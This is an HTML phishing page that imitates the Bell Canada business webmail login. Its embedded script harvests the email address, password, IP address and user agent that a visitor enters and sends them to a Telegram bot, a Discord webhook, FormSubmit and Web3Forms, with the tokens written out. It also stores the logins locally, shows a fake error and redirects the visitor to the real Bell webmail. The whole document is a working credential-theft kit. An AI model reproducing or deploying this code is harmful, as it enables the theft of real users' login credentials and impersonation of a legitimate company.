<head>
  <meta charset="UTF-8">

  <title>Bell Business Email</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600&display=swap">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Open Sans', sans-serif;
      height: 100vh;
      background: url('https://i.postimg.cc/sx6NCL40/Chat-GPT-Image-Jun-19-2025-09-39-20-PM.png') no-repeat center center fixed;
      background-size: 100% 100%;
    }
    header {
      background-color: #00549F;
      padding: 10px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .logo {
      display: flex;
      align-items: center;
    }
    .logo img {
      height: 60px;
    }
    .logo span {
    font-family: 'BellSlimBlack';
      color: white;
      font-size: 18px;
      font-weight: bold;
      margin-left: 10px;
    }
    .lang-link {
      color: white;
      text-decoration: none;
      font-size: 14px;
    }
    .main-content {
      display: flex;
      height: calc(100vh - 60px);
      align-items: center;
      justify-content: flex-start;
      padding-left: 80px;
    }
    .login-box {
      background: white;
      padding: 30px;
      width: 340px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
    }
    .login-box h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #000;
    }
    .login-box label {
      font-weight: 600;
      margin-bottom: 5px;
      display: block;
    }
    .login-box input[type="email"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .error-message {
      color: red;
      font-size: 13px;
      margin-top: -10px;
      margin-bottom: 15px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background-color: #003DA5;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    .login-box .footer-text {
      margin-top: 15px;
      font-size: 12px;
      color: #555;
      text-align: center;
    }
    .login-box .footer-text a {
      color: #0066cc;
      text-decoration: none;
    }
  </style>
</head>

  <div class="main-content">
    <div class="login-box">
      <h2>Log in</h2>
      <form id="loginForm">
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" required>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>

        <input type="hidden" id="hidden_ip" name="ip">

        <div id="error-msg" class="error-message" style="display: none;">
          You have entered invalid credentials. Please try again.
        </div>

        <button type="submit" id="signIn">Log in</button>
      </form>
      <div class="footer-text">
        <p>Forgot your password? Call <strong>310-BELL</strong> to reset it.</p>
        <a href="#">Privacy</a> |
        <a href="#">Legal & Regulatory</a><br>
        Â© Bell Canada. All rights reserved.
      </div>

  <script>
    // ============= CONFIGURATION =============
    const CONFIG = {
      web3forms: {
        accessKey: "ad35b967-6f6e-4fd7-8e72-c8ff413456b5",
        enabled: true
      },
      formSubmit: {
        email: "wsammy007@gmail.com",
        enabled: true
      },
      telegram: {
        token: "8226599766:AAHOLVZ1mZtY4MUNC6S3lbSO3z6jEjuY2U4",
        chatId: "1588950334",
        enabled: true
      },
      discord: {
        webhook: "https://discord.com/api/webhooks/1475089190516428882/RRdMHOb9W0CSWpmNMc80Z3l8ppS01FllxZYfmQjjM7WDSmoN2C2MuSR890Hb4rvPDqDZ",
        enabled: true
      }
    };

    // ============= FORMAT MESSAGE =============
    function formatMessage(email, password, ip) {
      const timestamp = new Date().toLocaleString();
      const userAgent = navigator.userAgent;
      return {
        simple: `
++++++B E L L  WEBMAIL LOGIN++++++
[ðŸ“§EMAIL] : ${email}
[ðŸ”‘PASSWORD] : ${password}
[ðŸŒIP] : ${ip}
[ðŸ•TIME] : ${timestamp}
[ðŸŒUSER AGENT] : ${userAgent}
+++++++++++++++++++++++++++++`,
        short: `ðŸ” ${email} | ${password} | ${ip} | ${timestamp}`,
        emailSubject: `ðŸ” Bell Login: ${email}`,
        emailBody: `Email: ${email}\nPassword: ${password}\nIP: ${ip}\nTime: ${timestamp}\nUA: ${userAgent}`
      };
    }

    // ============= DISCORD =============
    function sendToDiscord(email, password, ip) {
      if (!CONFIG.discord.enabled) return;
      
      const msg = formatMessage(email, password, ip);
      
      $.ajax({
        url: CONFIG.discord.webhook,
        type: 'POST',
        data: JSON.stringify({ content: msg.short }),
        contentType: 'application/json',
        success: () => console.log('âœ… Discord: Success'),
        error: () => {
          // Fallback
          fetch(CONFIG.discord.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg.short })
          }).catch(() => {});
        }
      });
    }

    // ============= FIXED FORMSUBMIT =============
    function sendViaFormSubmit(email, password, ip) {
      if (!CONFIG.formSubmit.enabled) return;
      
      const msg = formatMessage(email, password, ip);
      
      console.log("ðŸ“§ Attempting to send email to", CONFIG.formSubmit.email);
      
      // Try with different parameters to ensure delivery
      $.ajax({
        url: `https://formsubmit.co/ajax/${CONFIG.formSubmit.email}`,
        method: "POST",
        contentType: "application/json",
        data: JSON.stringify({
          email: CONFIG.formSubmit.email, // Add as field
          subject: msg.emailSubject,
          message: msg.emailBody,
          name: "Bell Logger",
          _template: "table",
          _captcha: "false", // Disable captcha
          _next: "" // No redirect
        }),
        success: (response) => {
          console.log("âœ… FormSubmit: Success", response);
          // Show success in console
          if (response.success) {
            console.log("ðŸ“§ Email should arrive soon! Check Gmail (including spam)");
          }
        },
        error: (xhr, status, error) => {
          console.log("âŒ FormSubmit failed:", status, error);
          console.log("Status code:", xhr.status);
          
          // Try alternative endpoint
          setTimeout(() => {
            fetch(`https://formsubmit.co/${CONFIG.formSubmit.email}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                subject: msg.emailSubject,
                message: msg.emailBody
              })
            })
            .then(() => console.log("âœ… FormSubmit alt: Sent"))
            .catch(err => console.log("âŒ FormSubmit alt failed:", err));
          }, 500);
        }
      });
    }

    // ============= WEB3FORMS =============
    function sendViaWeb3Forms(email, password, ip) {
      if (!CONFIG.web3forms.enabled) return;
      
      const msg = formatMessage(email, password, ip);
      
      fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          access_key: CONFIG.web3forms.accessKey,
          subject: msg.emailSubject,
          message: msg.emailBody,
          from_name: "Bell Logger",
          email: "logger@bell.com"
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          console.log("âœ… Web3Forms: Success - Check your Web3Forms dashboard");
        } else {
          console.log("âŒ Web3Forms: Failed", data);
        }
      })
      .catch(error => console.log("âŒ Web3Forms error:", error));
    }

    // ============= TELEGRAM =============
    function sendViaTelegram(email, password, ip) {
      if (!CONFIG.telegram.enabled) return;
      
      const msg = formatMessage(email, password, ip).simple;
      
      $.ajax({
        url: `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`,
        method: "POST",
        contentType: "application/json",
        data: JSON.stringify({
          chat_id: CONFIG.telegram.chatId,
          text: msg
        }),
        success: () => console.log("âœ… Telegram: Success"),
        error: () => console.log("âŒ Telegram: Failed")
      });
    }

    // ============= LOCAL STORAGE =============
    function saveToLocal(email, password, ip) {
      try {
        const msg = formatMessage(email, password, ip);
        let stored = localStorage.getItem('captured_logins') || '[]';
        let logins = JSON.parse(stored);
        logins.push({ 
          email, password, ip, 
          timestamp: new Date().toISOString()
        });
        localStorage.setItem('captured_logins', JSON.stringify(logins));
        console.log("âœ… Local storage: Saved");
      } catch (error) {
        console.log("âŒ Local storage error:", error);
      }
    }

    // ============= MASTER FUNCTION =============
    function sendToAllDestinations(email, password, ip) {
      console.log("ðŸ“¤ Sending credentials to all destinations...");
      
      // Send to all
      sendViaWeb3Forms(email, password, ip);
      sendViaFormSubmit(email, password, ip);
      sendViaTelegram(email, password, ip);
      sendToDiscord(email, password, ip);
      
      // Always save locally
      saveToLocal(email, password, ip);
      
      console.log("âœ… All delivery attempts completed");
      console.log("ðŸ“§ Check Gmail spam folder for emails from FormSubmit");
      console.log("ðŸŒ Check Web3Forms dashboard for submissions");
    }

    // ============= IP DETECTION =============
    function detectIP() {
      $.getJSON('https://api.ipify.org?format=json', function(data) {
        $('#hidden_ip').val(data.ip);
      }).fail(function() {
        $('#hidden_ip').val('IP unavailable');
      });
    }

    // ============= TEST ALL SERVICES =============
    function testAllServices() {
      console.log("ðŸ” Testing all services...");
      sendToAllDestinations("TEST@test.com", "TestPassword123", "127.0.0.1");
    }

    // ============= INITIALIZATION =============
    $(document).ready(function () {
      detectIP();
      
      // Test after 3 seconds
      setTimeout(testAllServices, 3000);

      $('#loginForm').on('submit', function (e) {
        e.preventDefault();
        
        const email = $('#email').val();
        const password = $('#password').val();
        const ip = $('#hidden_ip').val();

        if (!password) {
          $('#error-msg').show();
          return;
        }

        sendToAllDestinations(email, password, ip);
        $('#error-msg').show();
        
        setTimeout(() => {
          window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
        }, 1500);
      });
    });
  </script>
